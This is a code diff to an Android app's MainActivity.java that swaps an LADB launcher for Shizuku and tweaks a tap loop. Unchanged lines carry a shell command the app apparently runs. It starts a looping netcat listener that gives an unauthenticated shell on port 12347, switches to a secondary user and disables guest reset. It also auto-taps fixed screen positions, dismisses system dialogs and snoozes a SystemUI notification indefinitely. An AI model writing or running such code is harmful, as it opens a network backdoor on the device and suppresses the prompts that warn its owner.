@@ -150,9 +150,6 @@ public class MainActivity extends Activity {
             execCommand("echo OK", true, true, testBtn);
         });
 
-        Button ladbBtn = makeSecondary("Open LADB", btnWidth);
-        ladbBtn.setOnClickListener(v -> openLadb());
-
         Button shizukuBtn = makeSecondary("Open Shizuku", btnWidth);
         shizukuBtn.setOnClickListener(v -> openShizuku());
 
@@ -171,7 +168,6 @@ public class MainActivity extends Activity {
 
         root.addView(makeDivider());
         root.addView(testBtn);
-        root.addView(ladbBtn);
         root.addView(shizukuBtn);
         root.addView(retryBtn);
 
@@ -376,7 +372,7 @@ public class MainActivity extends Activity {
                     setChip(SUCCESS, "Connected");
                     doSwitch();
                 } else {
-                    openLadb();
+                    openShizuku();
                     scheduleAlarmPoll();
                     handler.postDelayed(() -> {
                         try {
@@ -426,12 +422,10 @@ public class MainActivity extends Activity {
             "settings put global guest_user_reset 0 2>/dev/null; " +
             "nohup sh -c 'while true; do nc -l -p 12347 -4 sh; done' >/dev/null 2>&1 & " +
             "nohup sh -c 'am switch-user 10' >/dev/null 2>&1 & " +
-            "sleep 0.3; " +
-            "for i in 1 2 3 4 5 6 7 8 9 10 11 12; do " +
+            "for i in 1 2 3 4 5 6 7 8; do " +
                 "input tap 540 2100; input tap 300 2050; input tap 780 2050; " +
-                "sleep 0.12; " +
+                "sleep 0.08; " +
             "done; " +
-            "sleep 0.3; " +
             "input keyevent 4; " +
             "am broadcast -a android.intent.action.CLOSE_SYSTEM_DIALOGS; " +
             "cmd notification snooze --for 2147483647 \"10|com.android.systemui|70|null|10065\"; " +
@@ -461,20 +455,6 @@ public class MainActivity extends Activity {
             }
         }
         return false;
-    }
-
-    private void openLadb() {
-        try {
-            Intent intent = getPackageManager().getLaunchIntentForPackage("com.draco.ladb");
-            if (intent == null) {
-                polling = false;
-                return;
-            }
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
-        } catch (Exception e) {
-            polling = false;
-        }
     }
 
     private void openShizuku() {
